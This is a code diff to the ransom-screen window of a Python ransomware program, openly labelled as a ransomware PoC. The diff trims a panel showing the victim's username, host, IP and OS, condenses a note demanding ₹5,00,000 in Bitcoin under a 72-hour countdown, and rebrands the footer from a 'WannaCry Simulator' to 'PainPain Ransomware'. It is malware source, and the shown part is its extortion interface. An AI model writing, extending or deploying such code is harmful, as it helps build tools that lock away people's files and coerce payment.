@@ -59,25 +59,11 @@ class RansomwareGUI(tk.Tk):
         self.timer_label = tk.Label(self, text="Time left: 72:00:00", font=("Courier", 20, "bold"), fg="#ffff00", bg="#000000")
         self.timer_label.pack(pady=(10, 10))
 
-        user = getpass.getuser()
-        host = platform.node()
-        ip = self.get_local_ip()
-        os_name = platform.system() + " " + platform.release()
-        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        info_text = f"User: {user}\nHost: {host}\nIP: {ip}\nOS: {os_name}\nTime: {now}"
-        if self.target_dir:
-            info_text += f"\nTarget: {self.target_dir}"
-        info = tk.Label(self, text=info_text, font=("Courier", 10), fg="#ff4444", bg="#000000", justify="left")
-        info.pack(pady=(0, 10))
-
         note_frame = tk.Frame(self, bg="#1a0000", bd=2, relief="solid")
         note_frame.pack(padx=30, pady=10, fill="x")
         note = tk.Label(note_frame, text=(
             "YOUR DOCUMENTS, PHOTOS, DATABASES AND OTHER IMPORTANT FILES HAVE BEEN ENCRYPTED!\n\n"
-            "If you see this message, your files are NO LONGER ACCESSIBLE.\n"
-            "You must PAY A RANSOM in BITCOIN to get them back!\n\n"
-            "Send Rupee 5,00,000 worth of BTC to the address below.\n"
-            "After payment, enter the code and click 'Decrypt Files'.\n\n"
+            "TO RECOVER THEM, PAY ₹5,00,000 IN BITCOIN TO THE ADDRESS BELOW.\n"
             "FAILURE TO PAY WITHIN 3 DAYS WILL RESULT IN PERMANENT FILE LOSS!\n"
         ), font=("Courier", 12, "bold"), fg="#ffcc00", bg="#1a0000", justify="left", wraplength=620)
         note.pack(padx=10, pady=10)
@@ -105,7 +91,7 @@ class RansomwareGUI(tk.Tk):
                                      bd=3, relief="raised")
         self.decrypt_btn.pack(side="left", ipady=6)
 
-        footer = tk.Label(self, text="WannaCry Simulator PoC - FOR EDUCATIONAL USE ONLY", font=("Courier", 9), fg="#888888", bg="#000000")
+        footer = tk.Label(self, text="PainPain Ransomware PoC - FOR EDUCATIONAL USE ONLY", font=("Courier", 9), fg="#888888", bg="#000000")
         footer.pack(side="bottom", pady=10)
 
     def update_timer(self):
